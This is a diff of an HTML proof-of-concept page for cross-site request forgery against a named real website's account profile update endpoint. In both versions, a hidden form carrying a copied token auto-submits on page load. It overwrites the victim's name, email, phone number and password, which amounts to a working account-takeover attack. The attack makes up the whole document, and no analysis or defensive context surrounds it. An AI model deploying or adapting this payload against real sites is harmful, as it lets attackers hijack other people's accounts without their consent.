@@ -1,44 +1,37 @@
 <!DOCTYPE html>
-<html>
-  <head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSRF PoC</title>
-  </head>
-  <body>
-    <h1>CSRF PoC Exploit</h1>
-    <form
-      id="csrfForm"
-      action="https://www.azhapasa.com/account/profile/update"
-      method="POST"
-      enctype="multipart/form-data"
-    >
-      <!-- CSRF Token -->
-      <input
-        type="hidden"
-        name="_token"
-        value="2Y1EMespIrbuvy5Y588LPLsoq7TgLAPuTnPtk6mI"
-      />
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form id="csrfPoC" action="https://www.azhapasa.com/account/profile/update" method="POST" enctype="multipart/form-data">
+        <!-- CSRF Token -->
+        <input type="hidden" name="_token" value="Kor9WpsJjESrZUu75RR82eMfjvIeBlCEvJoW5maj">
 
-      <!-- Malicious data -->
-      <input type="hidden" name="name" value="Hacked Name" />
-      <input type="hidden" name="email" value="hacker@example.com" />
-      <input type="hidden" name="contact_no" value="1234567890" />
-      <input type="hidden" name="password" value="NewP@ssw0rd!" />
-      <input type="hidden" name="new_password" value="NewP@ssw0rd!" />
-      <input type="hidden" name="confirm_password" value="NewP@ssw0rd!" />
-      <input type="hidden" name="avatar" value="" />
-      <input type="hidden" name="dzongkhag" value="" />
-      <input type="hidden" name="location" value="" />
-      <input type="hidden" name="lat" value="" />
-      <input type="hidden" name="long" value="" />
-      <input type="hidden" name="address" value="123 Hacker St" />
-      <input type="hidden" name="work_address" value="456 Evil Corp" />
+        <!-- Form Data (malicious) -->
+        <input type="hidden" name="name" value="Govinda">
+        <input type="hidden" name="email" value="govindaaupadhyaa51@example.com">
+        <input type="hidden" name="contact_no" value="1234567890">
+        <input type="hidden" name="password" value="NewP@ssw0rd!">
+        <input type="hidden" name="new_password" value="NewP@ssw0rd!">
+        <input type="hidden" name="confirm_password" value="NewP@ssw0rd!">
+        <input type="hidden" name="avatar" value="">
+        <input type="hidden" name="dzongkhag" value="">
+        <input type="hidden" name="location" value="">
+        <input type="hidden" name="lat" value="">
+        <input type="hidden" name="long" value="">
+        <input type="hidden" name="address" value="nowhere">
+        <input type="hidden" name="work_address" value="nowhere">
 
-      <input type="submit" value="Submit CSRF Request" />
+        <input type="submit" value="Submit CSRF Request">
     </form>
 
     <script>
-      // Auto-submit the form to perform the CSRF attack
-      document.getElementById("csrfForm").submit();
+        // Automatically submit the form upon page load
+        document.getElementById('csrfPoC').submit();
     </script>
-  </body>
+</body>
 </html>
